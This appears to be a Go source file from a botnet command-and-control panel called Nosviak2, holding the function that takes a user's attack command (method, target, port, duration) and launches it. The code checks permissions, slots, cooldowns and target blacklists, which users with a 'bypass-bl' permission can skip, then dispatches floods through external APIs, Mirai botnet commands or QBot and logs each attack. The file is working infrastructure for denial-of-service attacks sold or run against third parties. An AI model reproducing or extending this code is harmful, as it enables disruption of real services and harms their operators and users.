package attacks

import (
	"Nosviak2/core/clients/animations"
	"Nosviak2/core/clients/sessions"
	deployment "Nosviak2/core/configs"
	"Nosviak2/core/database"
	"Nosviak2/core/sources/language"
	"Nosviak2/core/sources/layouts/json"
	"Nosviak2/core/sources/layouts/toml"

	"fmt"
	"log"
	"strconv"
	"strings"
	"time"
)

type AttackModel struct {
	//stores the cmds inside the requests
	//ensures its done without errors happening
	Commands []string //stored inside array properly
	//stores the target properly without issues
	//this will ensure its done without issues and makes sure its properly
	session *sessions.Session //stored inside the structure properly
}

// creates the new attack settings
// this will ensure its done without issues happening
func MakeAttack(commands []string, s *sessions.Session) *AttackModel {
	return &AttackModel{Commands: commands, session: s} //returns the model properly
}

// properly runs the target execution
// this will execute each model without issues happening
func (at *AttackModel) RunTarget() error {

	//stores if attacks are enabled
	//this will ensure that its properly checked
	if !AttacksEnabled { //returns the language properly
		return language.ExecuteLanguage([]string{"attacks", "global_disabled.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0]})
	}

	//checks if the method exists
	//this will ensure that its done without issues happening
	method := QueryMethod(strings.ToLower(at.Commands[0])) //tries to find the method
	if method == nil {                                     //checks if the method was found properly and makes sure they can access without errors happening
		return language.ExecuteLanguage([]string{"attacks", "unknown-method.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0]})
	}

	//cant access the method which was selected
	if len(method.Permissions) > 0 && !at.session.CanAccessArray(method.Permissions) {
		return language.ExecuteLanguage([]string{"attacks", "missing-permissions.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0]})
	}

	//this will ensure its enabled
	//allows for proper control without issues
	if !method.Enabled { //checks if method is enabled
		return language.ExecuteLanguage([]string{"attacks", "disabled_method.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0]})
	}

	//checks for length issues
	//this will ensure its done properly
	if len(at.Commands) <= 1 { //checks the length and returns the error properly without issues happening
		return language.ExecuteLanguage([]string{"attacks", "syntax.itl"}, at.session.Channel, deployment.Engine, at.session, make(map[string]string))
	}

	//stores all of the fetched key values
	//this will ensure they can be used without any errors
	var KeyValues map[string]*KeyValue = make(map[string]*KeyValue)

	//this will also check for defaults needing
	//this will allow for proper KV Value usage within the system
	for arg := 2; arg < len(at.Commands); arg++ { //loops through the args properly
		//checks for the keyValue properly
		//this will ensure the prefix is there safely
		if !Defaulter(at.Commands[arg]) { //checks the keyValue properly without issues happening
			//this will try to follow through with port, duration
			//makes sure they are not ignored properly without any errors
			if arg == 2 || arg == 3 { //pass through for defaultPort safely
				continue //continues looping properly
			} //renders the invalid keyvalue flag properly without issues
			return language.ExecuteLanguage([]string{"attacks", "invalid_kv_flag.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"kv": at.Commands[arg]})
		}

		//port and duration detection missing properly
		if arg == 2 { //default port & duration saved safely into this array
			sync := append([]string{strconv.Itoa(method.Options.DefaultDuration), strconv.Itoa(method.Options.DefaultPort)}, at.Commands[arg:]...)
			at.Commands = append(at.Commands[:arg], sync...)
			continue //saves into properly without any errors happening
		} else if arg == 3 { //default port only saved into the array here properly
			sync := append([]string{strconv.Itoa(method.Options.DefaultPort)}, at.Commands[arg:]...) //port properly
			at.Commands = append(at.Commands[:arg], sync...)
			continue //saves into properly without any errors happening
		}

		//removes the key value prefix properly without issues
		//this will ensure its done without any errors happening
		at.Commands[arg] = strings.Replace(at.Commands[arg], toml.AttacksToml.Attacks.KVPrefix, "", 1)

		//resolves the flag properly and safely
		//this will ensure its done without any errors happening
		kv, correct, err := ResolveFlag(at.Commands[arg], method, at.session)
		if err != nil || !correct { //properly checks the statement
			return nil //ends the function properly
		}

		//saves into the map properly
		//this will ensure its done without any errors
		KeyValues[kv.Name] = kv //saves into keyValues safely
	}

	//verifys the keyvalue statements
	//this will ensure its done without any errors
	if key, err := VerifyInformation(KeyValues, method, at.session); !key || err != nil {
		return nil //ends the function path properly and safely
	}

	//checks the length properly
	//this will ensure its done without errors
	if len(at.Commands) <= 3 { //length checks properly
		if len(at.Commands) == 2 {
			at.Commands = append(at.Commands, []string{strconv.Itoa(method.Options.DefaultDuration), strconv.Itoa(method.Options.DefaultPort)}...)
		} else {
			at.Commands = append(at.Commands, []string{strconv.Itoa(method.Options.DefaultPort)}...)
		}
	}

	//checks for the target to be blacklisted
	//this will ensure its done without issues happening
	blacklisted, err := CheckBlacklist(at.Commands[1]) //checks
	//this will ensure its done without any errors happening on purpose
	if err != nil && !at.session.CanAccess("bypass-bl") { //properly checks
		return language.ExecuteLanguage([]string{"attacks", "database-fault.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	if !ValidateTarget(at.Commands[1]) {
		return language.ExecuteLanguage([]string{"attacks", "invalid_target.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//checks for the bypass blacklisting
	//this will ensure its done without issues happening
	if blacklisted && !at.session.CanAccess("bypass-bl") { //returns target blacklisted properly
		return language.ExecuteLanguage([]string{"attacks", "target-blacklisted.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//tries to properly convert the port into a int
	//this will ensure its done without errors happening on reqeust
	Port, err := strconv.Atoi(at.Commands[3])   //tries to parse without issues
	if err != nil || Port < 0 || Port > 65535 { //error handles and returns the branding subject if its invalid properly
		return language.ExecuteLanguage([]string{"attacks", "port-atoi.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//tries to find the group properly
	//this will ensure its done without errors
	methodGroup := FindGroup(method) //returns the group
	if methodGroup == nil {
		return language.ExecuteLanguage([]string{"attacks", "unknown-method.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0]})
	}

	if !MethodAttackSlots(method) { // Checks for the max slots error
		return language.ExecuteLanguage([]string{"attacks", "slots_reached.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"group": methodGroup.Name, "max_slots": strconv.Itoa(methodGroup.Conns)})
	}

	//tries to properly convert the duration into a int
	//this will ensure its done without errors happening on reqeust
	Duration, err := strconv.Atoi(at.Commands[2])                                                                                                                                                                                                                                                                                            //converts into int
	if err != nil || method.Options.MaxTimeOverride > 0 && Duration > method.Options.MaxTimeOverride || method.Options.EnMaxtime <= 0 && Duration > at.session.User.MaxTime && at.session.User.MaxTime != 0 || method.Options.EnMaxtime > 0 && Duration > method.Options.EnMaxtime || methodGroup != nil && methodGroup.MaxTime < Duration { //properly tries to error handle without issues happening
		return language.ExecuteLanguage([]string{"attacks", "duration-atoi.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]}) //returns the language properly without issues
	}

	//user cant bypass the powersaving feature
	if !at.session.CanAccess("bypass_ps") {

		///all running attacks with that target
		running, err := database.Conn.AttackingTarget(at.Commands[1])
		if err == nil && len(running) >= 1 { //powersaving attack alert
			return language.ExecuteLanguage([]string{"attacks", "powersaving-alert.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "left": fmt.Sprintf("%.0f", time.Until(time.Unix(running[len(running)-1].Finish, 0)).Seconds())})
		}
	}

	//gets all the ongoing attacks which me user has launched
	//this will ensure its done without errors happening on request
	MeAttacking, err := database.Conn.Attacking(at.session.User.Username)
	if err != nil { //error handles the statement without issues happening
		if deployment.DebugMode { //detects if debug mode is enabled
			log.Printf("[ERROR] [DEBUG] err: %s\r\n", err.Error())
		}
		return language.ExecuteLanguage([]string{"attacks", "database-fault.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//checks for any running attacks
	//this will ensure its done without errors happening
	if len(MeAttacking) > 0 { //checks the length correctly
		//checks the concurrent properly
		//this will ensure its done without errors happening
		if at.session.User.Concurrents > 0 && at.session.User.Concurrents < len(MeAttacking) { //this will render the max concurrent branding piece correctly
			return language.ExecuteLanguage([]string{"attacks", "max-concurrents.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2], "running": strconv.Itoa(len(MeAttacking))})
		}

		//gets the futherest running attack to the finish properly
		//this will ensure we only use the closest possible attack to work information
		var recent *database.AttackLinear = &MeAttacking[0]
		//ranges through all the running attacks
		//this will ensure its done without errors happening
		for _, attk := range MeAttacking { //ranges through properly
			//checks was is closest to finishing properly
			if attk.Created > recent.Created { //checks
				//updates the permissions properly
				recent = &attk
				continue //continues the loop
			}
		}

		//checks if the user is inside the cooldown period
		//this will ensure its done without issues happening on reqeusts safely
		if !method.Options.CooldownBypass && recent.Created+int64(at.session.User.Cooldown) > time.Now().Unix() && at.session.User.Cooldown > 0 {
			cooldownEnd := time.Unix(recent.Created+int64(at.session.User.Cooldown), 64) //creates the cooldown end object
			//this will ensure its properly done without errors happening on purpose within the statement
			return language.ExecuteLanguage([]string{"attacks", "cooldown-active.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"untilcooldown": fmt.Sprintf("%.0f", time.Until(cooldownEnd).Seconds()), "method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
		}
	}

	//sets the information properly
	//this will ensure its done without any errors happening
	finish, created := time.Now().Add(time.Duration(Duration)*time.Second).Unix(), time.Now().Unix()

	//checks the global limit properly
	//this will ensure its done without any issues
	WithMethod, err := database.Conn.AttackingWithMethod(at.session.User.Username, strings.ToLower(at.Commands[0]))
	if err != nil || method.Options.GlobalPerUser > 0 && len(WithMethod) > method.Options.GlobalPerUser { //checks the limits properly without issues
		//renders the branding properly for it without issues happening on purpose, this will try to make it safer without errors happening on reqeust etc...
		return language.ExecuteLanguage([]string{"attacks", "user_Limit_Reached.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"limit": strconv.Itoa(method.Options.GlobalPerUser), "method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//checks for method api properly
	//this will launch via the api protocol
	if method.Type == 1 { //this launches via api
		//runs the spinner correctly and properly while being safely
		//this will ensure its done without issues happening on request while sending
		go animations.RunSpinner(method.Options.Spinner, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})

		//tries to correctly launch the api method
		//this makes sure its done without errors happening
		err = at.LaunchAPI(&method.ApiInterface, KeyValues) //tries to launch the attack without issues
		animations.End(at.session)                          //tries to end the animation properly without issues

		//error handles the attack command properly
		//this will ensure its done without any errors happening
		if err != nil { //executes the attack fault branding properly ensures its complete without errors
			log.Printf("[ALERT] Attack fault has happened for %s\r\n", at.session.User.Username) //prints to the terminal log properly
			log.Printf("[ALERT] Reason: %s\r\n", err.Error())                                    //prints to the terminal log properly
			return language.ExecuteLanguage([]string{"attacks", "attack-fault.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
		}
		//this will detect the mirai launch properly
		//sends completely without any errors happening
	} else if method.Type == 2 { //launches via mirai
		//trial system to run attacks properly
		//this will ensure its done without any errors happening
		if sent, err := NewMiraiAttack(at.Commands[1], Duration, Port, method, at.session, KeyValues); err != nil || !sent {
			return err //returns the error properly without issues happening
		}

		//ranges through the different routes
		//this will ensure its done without issues
		for _, route := range method.Options.Routes {
			//checks the length properly
			//this will ensure its done safely
			if strings.Count(route, ".") <= 0 { //checks the length properly
				log.Printf("[ATTACKS] [ROUTE] failed to parse route: %s\r\n", route)
				continue
			}

			//splits the route properly without issues
			//this will ensure they are gotton properly and safely
			Header, Method := strings.Split(route, ".")[0], strings.Split(route, ".")[1]

			//checks the header properly
			//informs the header properly and safely
			if Header == "api" { //checks the header properly
				//checks the route properly
				//this will ensure its done without errors
				methodRoute := json.AttacksJson[Method]
				if methodRoute == nil {
					continue
				} //continues

				//launches the attack properly and safely
				//this will ensure its done without issues happening
				if err := at.LaunchAPI(&methodRoute.Target, make(map[string]*KeyValue)); err != nil {
					log.Printf("[ATTACKS] [ROUTE] %s\r\n", err.Error()) //continues looping
					continue                                            //continues the loop properly
				}
			}
		}

		//qbot method supprted here
		//this will ensure its done without issues
	} else if method.Type == 3 { //qbot header method

		LaunchQbot(at.Commands, method, at.session)
	}

	var TextType string = "unknown"
	if method.Type == 1 { //method type mirai
		TextType = "api" //api based support
	} else if method.Type == 2 { //method type mirai
		TextType = "mirai" //mirai based support
	} else if method.Type == 3 { //method type QBot
		TextType = "qbot"
	}

	//tries to properly log the attack into the database
	//this will ensure its done without errors happening on reqeust
	err = database.Conn.PushAttack(&database.AttackLinear{Method: at.Commands[0], Target: at.Commands[1], Username: at.session.User.Username, Duration: Duration, Port: Port, Created: created, Finish: finish, SentViaAPI: false})
	if err != nil { //error handles the database statement properly without issues happening on reqeusts
		if deployment.DebugMode { //detects if debug mode is enabled
			log.Printf("[ERROR] [DEBUG] err: %s\r\n", err.Error()) //renders error
		} //makes sure the error is broadcasted
		return language.ExecuteLanguage([]string{"attacks", "database-fault.itl"}, at.session.Channel, deployment.Engine, at.session, map[string]string{"method": at.Commands[0], "target": at.Commands[1], "port": at.Commands[3], "duration": at.Commands[2]})
	}

	//stores the default branding path properly
	//this will ensure its done without any errors
	var launchedBranding string = "attacks/attack-sent.itl"
	//checks the branding path length properly
	//this will ensure we use the one the user picked
	if len(method.Options.AttackBranding) > 0 {
		//sets the users selected branding properly
		//this will ensure its done without any errors
		launchedBranding = method.Options.AttackBranding
	}

	//stores our features values properly
	var System map[string]string = make(map[string]string)

	//ranges through the keyvalues properly
	//this will ensure its done without errors
	for key, value := range KeyValues { //ranges
		System["attack_"+key] = value.Value //attack_pps
	}

	System["method"] = at.Commands[0]              //method
	System["target"] = at.Commands[1]              //target
	System["port"] = at.Commands[3]                //port
	System["duration"] = at.Commands[2]            //duration
	System["created"] = strconv.Itoa(int(created)) //created unix
	System["finish"] = strconv.Itoa(int(finish))   //finish unix
	System["type"] = TextType                      //text type

	//returns the attack sent correctly branding
	//this will ensure they know the attack has been completed
	return language.ExecuteLanguage(strings.Split(launchedBranding, "/"), at.session.Channel, deployment.Engine, at.session, System)
}
